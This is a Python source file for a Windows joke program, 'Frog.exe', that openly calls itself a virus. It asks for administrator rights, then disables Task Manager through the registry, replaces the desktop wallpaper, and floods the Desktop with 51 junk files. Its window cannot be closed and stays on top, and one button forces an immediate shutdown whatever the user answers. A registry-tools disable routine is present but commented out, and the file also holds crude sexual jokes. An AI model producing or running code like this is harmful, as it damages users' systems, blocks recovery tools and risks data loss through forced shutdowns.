import customtkinter as ctk
import tkinter as tk
from tkinter import messagebox
from PIL import ImageTk, Image
import os
import sys
import ctypes
import shutil
from itertools import count
from playsound import playsound

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("green")

def change_background():
    # Copy background from temp folder to %localappdata%
    dest_path = "C:\\frog.jpg"
    src_path = resource_path("frog.jpg")
    
    try:
        shutil.copy(src_path, dest_path)     
    # If source and destination are same
    except shutil.SameFileError:
        print("Source and destination represents the same file.")
     
    # If there is any permission issue
    except PermissionError:
        print("Permission denied.")
     
    # For other errors
    except:
        print("Error occurred while copying file.")

    SPI_SETDESKWALLPAPER = 20 
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, dest_path, 0)

class ImageLabel(ctk.CTkLabel):
    """a label that displays images, and plays them if they are gifs"""
    def load(self, im):
        if isinstance(im, str):
            im = Image.open(im)
        self.loc = 0
        self.frames = []

        try:
            for i in count(1):
                self.frames.append(ImageTk.PhotoImage(im.copy()))
                im.seek(i)
        except EOFError:
            pass

        try:
            self.delay = im.info['duration']
        except:
            self.delay = 100

        if len(self.frames) == 1:
            self.config(image=self.frames[0])
        else:
            self.next_frame()

    def unload(self):
        self.config(image="")
        self.frames = None

    def next_frame(self):
        if self.frames:
            self.loc += 1
            self.loc %= len(self.frames)
            self.config(image=self.frames[self.loc])
            self.after(self.delay, self.next_frame)

def on_closing():
    pass

def open_frog():
    root = ctk.CTk()
    root.title("Frog.exe")
    root.geometry("800x500")
    root.iconbitmap(resource_path("frog.ico"))
    root.resizable(False, False)
    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.attributes('-topmost', True)

    def talk():
        messagebox.showinfo("Frog.exe", "The frog doesn't want to talk. He is dancing. THE BAD FROG")

    def throw():
        response = messagebox.askyesno("Frog.exe", "Do you hate your computer?")
        if response:
            messagebox.showinfo("Frog.exe", "OK, I'll let your computer have a fast and painless death")
            os.system("shutdown /s /f /t 0")
        else:
            messagebox.showinfo("Frog.exe", "If you don't hate your computer, why do you want to throw it???")
            messagebox.showinfo("Frog.exe", "Still, I'd like to throw it :)")
            os.system("shutdown /s /f /t 0")

    def view():
        dialog = ctk.CTkInputDialog(master = root, title = "Frog.exe", text = "Enter the PIN to open the frog's apartment:")
        if dialog.get_input() != "frog":
            messagebox.showinfo("Frog.exe", "The passcode is incorrect XD")
        else:
            os.system(resource_path("Apartment.jpg"))
            playsound(resource_path("file.mp3"))

    def kill():
        messagebox.showinfo("Frog.exe", "Nooo~, why would you kill me???")

    def fuck():
        messagebox.showinfo("Frog.exe", "Ooooooo~, yamete kudasai, oooooo~")

    img_frame = ctk.CTkFrame(master = root, width = 380, height = 490)
    img_frame.grid(row = 0, column = 0, padx = 10)

    btn_frame = ctk.CTkFrame(master = root, width = 380, height = 470)
    btn_frame.grid(row = 0, column = 1, padx = 10)

    frog_lbl = ImageLabel(master = img_frame)
    frog_lbl.pack()
    frog_lbl.load(resource_path("frog.gif"))

    lbl1 = tk.Label(master = btn_frame, text = "The frog hacked the computer.", font = ("Segoe UI", 17), bg = "black", fg = "green", anchor = tk.NW)
    lbl1.pack(fill = "both")

    lbl2 = tk.Label(master = btn_frame, text = "Throw out the computer.", font = ("Segoe UI", 17), bg = "black", fg = "green", anchor = tk.NW)
    lbl2.pack(fill = "both")

    lbl3 = tk.Label(master = btn_frame, text = "XD.", font = ("Segoe UI", 17), bg = "black", fg = "green", anchor = tk.NW)
    lbl3.pack(fill = "both")

    lbl4 = tk.Label(master = btn_frame, text = "What action to choose?", font = ("Segoe UI", 18), bg = "black", fg = "red", anchor = tk.NW)
    lbl4.pack(fill = "both")

    btn1 = ctk.CTkButton(master = btn_frame, text = "Talk to the frog", text_font = ("Segoe UI", 17), bg_color = "green", text_color = "blue", corner_radius = 7, hover = False, command = talk)
    btn1.pack(fill = "both", pady = 10)

    btn2 = ctk.CTkButton(master = btn_frame, text = "Throw the computer", text_font = ("Segoe UI", 17), bg_color = "green", text_color = "orange", corner_radius = 7, hover = False, command = throw)
    btn2.pack(fill = "both", pady = 10)

    btn3 = ctk.CTkButton(master = btn_frame, text = "View the frog's apartment", text_font = ("Segoe UI", 17), bg_color = "green", text_color = "yellow", corner_radius = 7, hover = False, command = view)
    btn3.pack(fill = "both", pady = 10)

    btn4 = ctk.CTkButton(master = btn_frame, text = "Kill the frog", text_font = ("Segoe UI", 17), bg_color = "green", text_color = "red", corner_radius = 7, hover = False, command = kill)
    btn4.pack(fill = "both", pady = 10)

    btn5 = ctk.CTkButton(master = btn_frame, text = "Fu*k the frog", text_font = ("Segoe UI", 17), bg_color = "green", text_color = "pink", corner_radius = 7, hover = False, command = fuck)
    btn5.pack(fill = "both", pady = 10)

    root.mainloop()

def intro():
    messagebox.showinfo("Frog.exe", "You confirm this is not a virus")
    messagebox.showerror("Frog.exe", "But this is a virus btw :>")
    messagebox.showinfo("Frog.exe", "The frog is s{frog}ing your computer")
    open_frog()

def disable_task_manager():
    os.system("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")

def disable_reg():
    os.system("REG add HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f")

def write_files():
    desktop_path = os.path.join(os.environ["HOMEPATH"], "Desktop")
    for i in range(51):
        try:
            with open(f"C:{desktop_path}\\Frog ({i})", "w") as f:
                for _ in range(10):
                    f.write("FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg\n")
                f.close()
        except: # This is for users with OneDrive account
            desktop_path = os.path.join(os.environ["HOMEPATH"], "OneDrive", "Desktop")
            with open(f"C:{desktop_path}\\Frog ({i})", "w") as f:
                for _ in range(10):
                    f.write("FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg FrOg\n")
                f.close()
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    disable_task_manager()
    change_background()
    write_files()
    # disable_reg()
    intro()
else:
    # Re-run the program with admin rights
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)